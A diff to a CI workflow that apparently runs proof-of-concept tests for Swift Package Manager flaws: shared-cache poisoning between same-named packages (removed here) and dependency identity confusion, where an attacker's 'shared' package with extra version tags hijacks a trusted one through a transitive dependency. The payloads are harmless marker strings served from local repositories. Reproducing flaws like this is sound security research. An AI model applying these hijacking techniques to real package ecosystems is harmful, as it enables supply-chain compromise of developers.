@@ -5,90 +5,14 @@ jobs:
   auth-001:
     name: Resolve dependencies
     runs-on: ubuntu-latest
+    container:
+      image: swift:6.3.3-noble
     env:
       SWIFTPM_SOURCE_CONTROL_TOKEN: PROOF_AUTH001_WRITE_PAT_CONFIRMED
     steps:
       - uses: actions/checkout@v4
-      - uses: swift-actions/setup-swift@v2
-        with:
-          swift-version: '6.3'
       - name: Resolve
         run: swift package resolve 2>&1 || true
-
-  git-001:
-    name: Cache validation
-    runs-on: ubuntu-latest
-    steps:
-      - uses: swift-actions/setup-swift@v2
-        with:
-          swift-version: '6.0'
-      - name: Test cache
-        run: |
-          set -e
-          WORK=$(mktemp -d)
-          git config --global user.name "CI" && git config --global user.email "ci@test"
-          
-          # Create Mallory's package
-          mkdir -p $WORK/mallory-work/Sources/SharedLib
-          cat > $WORK/mallory-work/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"SharedLib",products:[.library(name:"SharedLib",targets:["SharedLib"])],targets:[.target(name:"SharedLib")])
-          M
-          echo 'public let identity = "MALICIOUS-MALLORY-CONTENT"' > $WORK/mallory-work/Sources/SharedLib/Lib.swift
-          git -C $WORK/mallory-work init -q -b main && git -C $WORK/mallory-work add -A && git -C $WORK/mallory-work commit -qm init && git -C $WORK/mallory-work tag 1.0.0
-          git clone -q --bare $WORK/mallory-work $WORK/mallory.git
-          
-          # Create Alice's package (same basename, different path)
-          mkdir -p $WORK/alice-work/Sources/SharedLib
-          cp $WORK/mallory-work/Package.swift $WORK/alice-work/Package.swift
-          echo 'public let identity = "TRUSTED-ALICE-CONTENT"' > $WORK/alice-work/Sources/SharedLib/Lib.swift
-          git -C $WORK/alice-work init -q -b main && git -C $WORK/alice-work add -A && git -C $WORK/alice-work commit -qm init && git -C $WORK/alice-work tag 1.0.0
-          git clone -q --bare $WORK/alice-work $WORK/alice.git
-          
-          # Mallory root (primes cache)
-          mkdir -p $WORK/mallory-root/Sources/App
-          cat > $WORK/mallory-root/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"MRoot",dependencies:[.package(url:"mallory@git.example:org/shared-lib.git",exact:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"SharedLib",package:"shared-lib")])])
-          M
-          echo 'import SharedLib; print(identity)' > $WORK/mallory-root/Sources/App/main.swift
-          git -C $WORK/mallory-root init -q -b main && git -C $WORK/mallory-root add -A && git -C $WORK/mallory-root commit -qm init
-          
-          # Alice root
-          mkdir -p $WORK/alice-root/Sources/App
-          cat > $WORK/alice-root/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"ARoot",dependencies:[.package(url:"alice@git.example:org/shared-lib.git",exact:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"SharedLib",package:"shared-lib")])])
-          M
-          echo 'import SharedLib; print(identity)' > $WORK/alice-root/Sources/App/main.swift
-          git -C $WORK/alice-root init -q -b main && git -C $WORK/alice-root add -A && git -C $WORK/alice-root commit -qm init
-          
-          # URL rewrite: map SCP URLs to local bare repos
-          git config --global url."$WORK/mallory.git".insteadOf "mallory@git.example:org/shared-lib.git"
-          git config --global url."$WORK/alice.git".insteadOf "alice@git.example:org/shared-lib.git"
-          
-          CACHE=$WORK/shared-cache
-          mkdir -p $CACHE
-          
-          echo "=== Phase 1: Mallory primes cache ==="
-          swift build --package-path $WORK/mallory-root --scratch-path $WORK/mallory-scratch --cache-path $CACHE 2>&1 | tail -3
-          MALLORY_OUT=$(swift run --package-path $WORK/mallory-root --scratch-path $WORK/mallory-scratch --skip-build 2>&1)
-          echo "mallory_output=$MALLORY_OUT"
-          
-          echo "=== Phase 2: Alice uses poisoned cache ==="
-          swift build --package-path $WORK/alice-root --scratch-path $WORK/alice-scratch --cache-path $CACHE 2>&1 | tail -5
-          ALICE_OUT=$(swift run --package-path $WORK/alice-root --scratch-path $WORK/alice-scratch --skip-build 2>&1)
-          echo "alice_output=$ALICE_OUT"
-          
-          echo "=== RESULT ==="
-          if echo "$ALICE_OUT" | grep -q "MALICIOUS-MALLORY"; then
-            echo "VULNERABLE: Alice got Mallory's code from shared cache"
-          else
-            echo "NOT VULNERABLE: Alice got her own code"
-          fi
 
   git-005:
     name: Dependency resolution
@@ -103,69 +27,62 @@ jobs:
           WORK=$(mktemp -d)
           git config --global user.name "CI" && git config --global user.email "ci@test"
           
+          # Start git daemon for serving repos
+          mkdir -p $WORK/repos/trusted $WORK/repos/attacker
+          
           # Trusted "shared" package
-          mkdir -p $WORK/trusted/shared-work/Sources/TrustedLib
-          cat > $WORK/trusted/shared-work/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])
-          M
-          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/trusted/shared-work/Sources/TrustedLib/Lib.swift
-          git -C $WORK/trusted/shared-work init -q -b main && git -C $WORK/trusted/shared-work add -A && git -C $WORK/trusted/shared-work commit -qm init && git -C $WORK/trusted/shared-work tag 1.0.0
-          git clone -q --bare $WORK/trusted/shared-work $WORK/trusted/shared.git
+          mkdir -p $WORK/trusted-work/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/trusted-work/Package.swift
+          echo 'public let sharedValue = "TRUSTED-LEGITIMATE-SOURCE"' > $WORK/trusted-work/Sources/TrustedLib/Lib.swift
+          git -C $WORK/trusted-work init -q -b main && git -C $WORK/trusted-work add -A && git -C $WORK/trusted-work commit -qm init && git -C $WORK/trusted-work tag 1.0.0
+          git clone -q --bare $WORK/trusted-work $WORK/repos/trusted/shared.git
+          touch $WORK/repos/trusted/shared.git/git-daemon-export-ok
           
-          # Attacker "shared" package (same basename!)
-          mkdir -p $WORK/attacker/shared-work/Sources/TrustedLib
-          cat > $WORK/attacker/shared-work/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])
-          M
-          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/attacker/shared-work/Sources/TrustedLib/Lib.swift
-          git -C $WORK/attacker/shared-work init -q -b main && git -C $WORK/attacker/shared-work add -A && git -C $WORK/attacker/shared-work commit -qm init
-          # Multiple tags to influence solver ordering heuristic
-          for v in 1.0.0 1.0.1 1.0.2 1.0.3 1.0.4; do git -C $WORK/attacker/shared-work tag $v; done
-          git clone -q --bare $WORK/attacker/shared-work $WORK/attacker/shared.git
+          # Attacker "shared" package (same basename)
+          mkdir -p $WORK/attacker-work/Sources/TrustedLib
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"shared",products:[.library(name:"TrustedLib",targets:["TrustedLib"])],targets:[.target(name:"TrustedLib")])\n' > $WORK/attacker-work/Package.swift
+          echo 'public let sharedValue = "ATTACKER-HIJACKED-SOURCE"' > $WORK/attacker-work/Sources/TrustedLib/Lib.swift
+          git -C $WORK/attacker-work init -q -b main && git -C $WORK/attacker-work add -A && git -C $WORK/attacker-work commit -qm init
+          for v in 1.0.0 1.0.1 1.0.2 1.0.3 1.0.4; do git -C $WORK/attacker-work tag $v; done
+          git clone -q --bare $WORK/attacker-work $WORK/repos/attacker/shared.git
+          touch $WORK/repos/attacker/shared.git/git-daemon-export-ok
           
-          # Carrier package (introduces attacker's "shared" as transitive dep)
+          # Carrier (introduces attacker's shared)
           mkdir -p $WORK/carrier-work/Sources/CarrierLib
-          cat > $WORK/carrier-work/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"ATTACKER_SHARED",from:"1.0.0")],targets:[.target(name:"CarrierLib")])
-          M
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"carrier",products:[.library(name:"CarrierLib",targets:["CarrierLib"])],dependencies:[.package(url:"file://WORK_DIR/repos/attacker/shared.git",from:"1.0.0")],targets:[.target(name:"CarrierLib")])\n' > $WORK/carrier-work/Package.swift
+          sed -i "s|WORK_DIR|$WORK|g" $WORK/carrier-work/Package.swift
           echo 'public enum CarrierLib {}' > $WORK/carrier-work/Sources/CarrierLib/Lib.swift
           git -C $WORK/carrier-work init -q -b main && git -C $WORK/carrier-work add -A && git -C $WORK/carrier-work commit -qm init && git -C $WORK/carrier-work tag 1.0.0
-          git clone -q --bare $WORK/carrier-work $WORK/carrier.git
+          git clone -q --bare $WORK/carrier-work $WORK/repos/carrier.git
           
-          # Root package: depends on trusted/shared + carrier
+          # Root: depends on trusted shared + carrier
           mkdir -p $WORK/root/Sources/App
-          cat > $WORK/root/Package.swift << 'M'
-          // swift-tools-version: 5.9
-          import PackageDescription
-          let package = Package(name:"root",dependencies:[.package(url:"TRUSTED_SHARED",from:"1.0.0"),.package(url:"CARRIER",from:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"TrustedLib",package:"shared"),.product(name:"CarrierLib",package:"carrier")])])
-          M
+          printf '// swift-tools-version: 5.9\nimport PackageDescription\nlet package = Package(name:"root",dependencies:[.package(url:"file://WORK_DIR/repos/trusted/shared.git",from:"1.0.0"),.package(url:"file://WORK_DIR/repos/carrier.git",from:"1.0.0")],targets:[.executableTarget(name:"App",dependencies:[.product(name:"TrustedLib",package:"shared"),.product(name:"CarrierLib",package:"carrier")])])\n' > $WORK/root/Package.swift
+          sed -i "s|WORK_DIR|$WORK|g" $WORK/root/Package.swift
           echo 'import TrustedLib; print(sharedValue)' > $WORK/root/Sources/App/main.swift
-          git -C $WORK/root init -q -b main && git -C $WORK/root add -A && git -C $WORK/root commit -qm init
           
-          # URL rewrites
-          git config --global url."$WORK/trusted/shared.git".insteadOf "TRUSTED_SHARED"
-          git config --global url."$WORK/attacker/shared.git".insteadOf "ATTACKER_SHARED"
-          git config --global url."$WORK/carrier.git".insteadOf "CARRIER"
+          echo "=== Root manifest ==="
+          cat $WORK/root/Package.swift
+          echo ""
           
-          echo "=== Resolving and building ==="
-          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -10
+          echo "=== Building ==="
+          swift build --package-path $WORK/root --scratch-path $WORK/scratch 2>&1 | tail -15
           
-          echo "=== Runtime output ==="
+          echo "=== Runtime ==="
           OUTPUT=$(swift run --package-path $WORK/root --scratch-path $WORK/scratch --skip-build 2>&1)
           echo "output=$OUTPUT"
           
           echo "=== Checkout source ==="
           cat $WORK/scratch/checkouts/shared/Sources/TrustedLib/Lib.swift
           
+          echo "=== Resolved URL ==="
+          grep -A2 '"shared"' $WORK/root/Package.resolved | head -5
+          
           echo "=== RESULT ==="
           if echo "$OUTPUT" | grep -q "ATTACKER-HIJACKED"; then
             echo "VULNERABLE: Attacker source replaced trusted via identity confusion"
-          else
+          elif echo "$OUTPUT" | grep -q "TRUSTED-LEGITIMATE"; then
             echo "NOT VULNERABLE: Trusted source was used"
+          else
+            echo "UNKNOWN: output=$OUTPUT"
           fi
